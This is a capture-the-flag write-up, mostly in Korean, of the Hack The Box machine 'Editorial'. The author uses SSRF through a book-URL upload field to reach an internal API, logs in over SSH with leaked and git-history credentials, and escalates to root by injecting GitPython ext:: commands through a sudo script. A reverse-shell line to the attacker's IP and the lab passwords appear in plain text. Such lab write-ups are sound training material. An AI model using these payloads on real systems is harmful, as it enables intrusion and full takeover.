---
tags:
  - type/machine
  - platform/htb
  - os/linux
  - status/solved
  - tech/lin/sudo-abuse
  - tech/svc/smb
  - tech/enum/dirbust
type: machine
platform: htb
os: linux
ip: 10.129.8.122
domain: editorial.htb
ports: [22, 80]
services: [http, ssh]
status: solved
tech_count: 3
---
## Nmap
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ nmap -sCV -p- -Pn -A --min-rate 5000 10.129.8.122 -oN nmap.log
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-14 21:15 +0900
Nmap scan report for 10.129.8.122
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 256/tcp)
HOP RTT       ADDRESS
1   221.22 ms 10.10.14.1
2   221.78 ms 10.129.8.122

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.58 seconds

```

hosts 세팅
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ cat /etc/hosts       
10.129.8.122    editorial.htb

```

웹 디렉토리 스캔하여 upload 경로 발견
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ feroxbuster -u http://editorial.htb -s 200 -t 100 -o feroxbuster.txt
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://editorial.htb/
 🚩  In-Scope Url          │ editorial.htb
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ feroxbuster.txt
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      210l      537w     7140c http://editorial.htb/upload
200      GET       72l      232w     2939c http://editorial.htb/about
200      GET       81l      467w    28535c http://editorial.htb/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
200      GET        7l     2189w   194901c http://editorial.htb/static/css/bootstrap.min.css
200      GET     4780l    27457w  2300540c http://editorial.htb/static/images/pexels-min-an-694740.jpg
200      GET      177l      589w     8577c http://editorial.htb/
200      GET    10938l    65137w  4902042c http://editorial.htb/static/images/pexels-janko-ferlic-590493.jpg
[####################] - 69s    30013/30013   0s      found:7       errors:0      
[####################] - 69s    30000/30000   435/s   http://editorial.htb/    
```

upload 페이지에서 Book information에 URL 입력 시 해당 URL로 요청을 보내는 것을 확인
```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 310
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary37bITTcqhcyFBhAq
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary37bITTcqhcyFBhAq
Content-Disposition: form-data; name="bookurl"

http://10.10.14.42/a.jpg
------WebKitFormBoundary37bITTcqhcyFBhAq
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream

------WebKitFormBoundary37bITTcqhcyFBhAq--

response
HTTP/1.1 200 OK

Server: nginx/1.18.0 (Ubuntu)

Date: Sat, 14 Mar 2026 05:42:19 GMT

Content-Type: text/html; charset=utf-8

Connection: keep-alive

Content-Length: 61



/static/images/unsplash_photo_1630734277837_ebe62757b6e0.jpeg
```

FUZZ  파일 생성
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ cat upload-cover                    
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 310
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary37bITTcqhcyFBhAq
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

------WebKitFormBoundary37bITTcqhcyFBhAq
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundary37bITTcqhcyFBhAq
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary37bITTcqhcyFBhAq--

```
ffuf 를 통해 FUZZ 하여 5000 포트 발견
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ ffuf -u http://editorial.htb/upload-cover -request upload-cover -w <( seq 0 65535) -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://editorial.htb/upload-cover
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Content-Type: multipart/form-data; boundary=----WebKitFormBoundary37bITTcqhcyFBhAq
 :: Header           : Origin: http://editorial.htb
 :: Header           : Referer: http://editorial.htb/upload
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: keep-alive
 :: Header           : Accept: */*
 :: Header           : Host: editorial.htb
 :: Header           : Accept-Language: en-US,en;q=0.9
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
 :: Data             : ------WebKitFormBoundary37bITTcqhcyFBhAq
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:FUZZ
------WebKitFormBoundary37bITTcqhcyFBhAq
Content-Disposition: form-data; name="bookfile"; filename=""
Content-Type: application/octet-stream


------WebKitFormBoundary37bITTcqhcyFBhAq--
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

5000                    [Status: 200, Size: 51, Words: 1, Lines: 1, Duration: 229ms]
:: Progress: [65536/65536] :: Job [1/1] :: 178 req/sec :: Duration: [0:06:29] :: Errors: 2 ::

```

유효성 검사
![[Pasted image 20260314151323.png]]

엔드포인트 목록
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ curl http://editorial.htb/static/uploads/5194c457-cc6a-4fee-b773-6b632fbd8275 -s | jq .
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}

```

/api/lastest/metadata/messages/authors 사용
![[Pasted image 20260314151810.png]]

자격증명 획득`dev/dev080217_devAPI!@`
```
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ curl -s 'http://editorial.htb/static/uploads/329f358a-721a-4dec-9fc1-2e409bfd3c95' | jq .
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."                                                                          
}

```

SSH를 통해 자격증명 인증 성공
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ netexec ssh editorial.htb -u dev -p 'dev080217_devAPI!@'
SSH         10.129.8.122    22     editorial.htb    [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
SSH         10.129.8.122    22     editorial.htb    [+] dev:dev080217_devAPI!@  Linux - Shell access!

```

SSH 접근 후 user.txt 획득
```bash
┌──(kali㉿kali)-[~/HTB/Editorial]
└─$ sshpass -p 'dev080217_devAPI!@' ssh -o StrictHostKeyChecking=no dev@editorial.htb

dev@editorial:~$
```

![[Pasted image 20260314152937.png]]

## Privilege Escalation

apps 폴더 안에서 .git 발견견
```bash
dev@editorial:~/apps$ ls -al
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5  2024 .
drwxr-x--- 4 dev dev 4096 Jun  5  2024 ..
drwxr-xr-x 8 dev dev 4096 Jun  5  2024 .git

```

git 커밋 내역에서 prod 계정 비밀번호 획득 `prod / 080217_Producti0n_2023!@`
```

```bash
dev@editorial:~/apps$ git log
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

```

```bash
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass

```

prod 계정으로 SSH 접속 성공 `prod/080217_Producti0n_2023!@`
```bash
┌──(kali㉿kali)-[~]
└─$ ssh prod@10.129.8.122 
The authenticity of host '10.129.8.122 (10.129.8.122)' can't be established.
ED25519 key fingerprint is: SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:59: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.8.122' (ED25519) to the list of known hosts.
prod@10.129.8.122's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

```

sudo 권한 확인
```bash
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *

```

python 파일 확인
```bash
prod@editorial:~$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

```

gitpython 라이브러리에서 RCE 취약점 발견

```
prod@editorial:~$ pip list | grep -i git
GitPython 3.1.29
```

POC 테스트 시 작동하는 것을 확인
```bash
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c touch% /home/prod/pwned'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c touch% /home/prod/pwned new_changes
  stderr: 'Cloning into 'new_changes'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
'
prod@editorial:~$ ls -l
total 0
-rw-r--r-- 1 root root 0 Mar 14 06:46 pwned

```

리버스쉘 연결 시도

```bash
prod@editorial:~$ echo "sh -i >& /dev/tcp/10.10.14.42/4444 0>&1" > ex.sh
prod@editorial:~$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /home/prod/ex.sh'

```

root.txt 획득
![[Pasted image 20260314154815.png]]